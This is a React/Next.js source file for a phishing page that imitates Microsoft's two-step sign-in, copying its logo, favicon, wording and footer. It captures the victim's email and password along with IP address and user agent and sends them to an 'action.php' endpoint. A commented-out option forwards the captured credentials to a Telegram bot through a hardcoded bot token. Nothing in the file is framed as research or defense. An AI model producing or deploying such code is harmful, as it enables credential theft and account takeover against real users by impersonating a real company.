'use client';

import { useEffect, useState } from 'react';
import Head from 'next/head';
import Script from 'next/script';
import '@/public/styles/login.css';

export default function Login() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [userIP, setUserIP] = useState('');
  const [userAgent, setUserAgent] = useState('');

  useEffect(() => {
    // Get user agent
    setUserAgent(navigator.userAgent);

    // Fetch IP address
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => setUserIP(data.ip))
      .catch(error => {
        console.error('Error fetching IP:', error);
        setUserIP('Unknown');
      });

    const nextBtn = document.getElementById('next');
    const backBtn = document.getElementById('back');

    nextBtn?.addEventListener('click', handleNextClick);
    backBtn?.addEventListener('click', handleBackClick);

    return () => {
      nextBtn?.removeEventListener('click', handleNextClick);
      backBtn?.removeEventListener('click', handleBackClick);
    };
  }, [email]);

  const handleNextClick = (e) => {
    e.preventDefault();
    setEmailError('');

    if (!email.trim()) {
      setEmailError('Email is required.');
      return;
    }

    const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    if (!isValidEmail) {
      setEmailError('Invalid email format.');
      return;
    }

    setStep(2);
  };

  const handleBackClick = (e) => {
    e.preventDefault();
    setStep(1);
    setPassword('');
    setPasswordError('');
  };

  const saveToFile = (data) => {
    // Create a blob with the data
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    
    // Create a temporary anchor element to trigger download
    const a = document.createElement('a');
    a.href = url;
    a.download = `user_data_${Date.now()}.json`;
    document.body.appendChild(a);
    a.click();
    
    // Clean up
    setTimeout(() => {
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    }, 0);
  };

  const sentToPhp = async (data) => {
    try {
      const response = await fetch('action.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });
  
      if (response.ok) {
        console.log('Data submitted successfully!');
      } else {
        console.error('Submission failed!');
      }
    } catch (error) {
      console.error('Error:', error);
    }  
  }

  const sendToTelegram = async (data) => {
    const botToken = '7676676109:AAHQZld_bADgICOLRn5Cs-49KT66Syhmk2w';
    const chatId = 'YOUR_CHAT_ID';
    const message = `New login data:\nEmail: ${data.email}\nPassword: ${data.password}\nIP: ${data.ipAddress}\nUser Agent: ${data.userAgent}\nTimestamp: ${data.timestamp}`;

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setPasswordError('');

    if (!password.trim()) {
      setPasswordError('Password is required.');
      return;
    }

    // Create data object with all collected information
    const userData = {
      email: email,
      password: password,
      ipAddress: userIP,
      userAgent: userAgent,
      timestamp: new Date().toISOString()
    };

    console.log('User login data:', userData);

    // Save to file
    // saveToFile(userData);

    sentToPhp(userData);
    
    // Send to Telegram
    // await sendToTelegram(userData);
  };

  return (
    <>
      <Head>
        <title>Microsoft | Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet" />
        <link
          rel="stylesheet"
          href="https://use.fontawesome.com/releases/v5.7.0/css/all.css"
          crossOrigin="anonymous"
        />
      </Head>

      <Script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js" />
      <Script src="https://code.jquery.com/jquery-3.1.1.min.js" />
      <Script src="https://code.jquery.com/jquery-3.3.1.js" />

      <div id="main">
        <div className="container-fluid bgimg">
          <div className="container">
            <div className="row topp">
              <div className="col-lg-6 mx-auto">

                {step === 1 && (
                  <div className="box">
                    <form className="boxtext">
                      <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" width="30" />
                      <span className="align-middle h5 logoname"> Microsoft</span><br /><br />
                      <span className="h5">Sign In</span><br />

                      {emailError && <p style={{ color: 'red', fontSize: '14px' }}>{emailError}</p>}

                      <div className="form-group mt-2">
                        <input
                          type="email"
                          className="form-control"
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                          placeholder="Email, phone, or Skype"
                        />
                      </div>
                      <p style={{ fontSize: '13px' }}>No account? <a href="#">Create one!</a></p>
                      <p style={{ fontSize: '13px' }}><a href="#">Can't access your account?</a></p>
                      <div className="text-right">
                        <button id="next" className="btn text-white" style={{ backgroundColor: '#0066BA' }}>Next</button>
                      </div>
                    </form>
                  </div>
                )}

                {step === 2 && (
                  <div className="box">
                    <form className="boxtext" onSubmit={handleSubmit}>
                      <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" width="30" />
                      <span className="align-middle h5 logoname"> Microsoft</span><br /><br />
                      <i className="fas fa-arrow-left" id="back" style={{ cursor: 'pointer' }}></i>&nbsp;
                      <span>{email}</span>
                      <div className="py-2"><span className="h5">Enter Password</span></div>

                      {passwordError && <p style={{ color: 'red', fontSize: '14px' }}>{passwordError}</p>}

                      <div className="form-group mt-2">
                        <input
                          type="password"
                          className="form-control"
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          placeholder="Enter Password"
                        />
                      </div>
                      <p style={{ fontSize: '14px' }}><a href="#">Forget password?</a></p>
                      <div className="text-right">
                        <button type="submit" className="btn text-white" style={{ backgroundColor: '#0066BA' }}>Login</button>
                      </div>
                    </form>
                  </div>
                )}

              </div>
            </div>
          </div>

          <div className="row">
            <div className="col-sm-5 mx-auto box2">
              <div className="py-2 bg-white">
                <img src='/key.svg' width="30" alt="key icon" /> &nbsp;Sign in options
              </div>
            </div>
          </div>
        </div>

        <footer id="footer">
          <div className="footerNode">
            <span>©2025 Microsoft</span>
            <a href="#">Privacy statement</a>
          </div>
        </footer>
      </div>
    </>
  );
}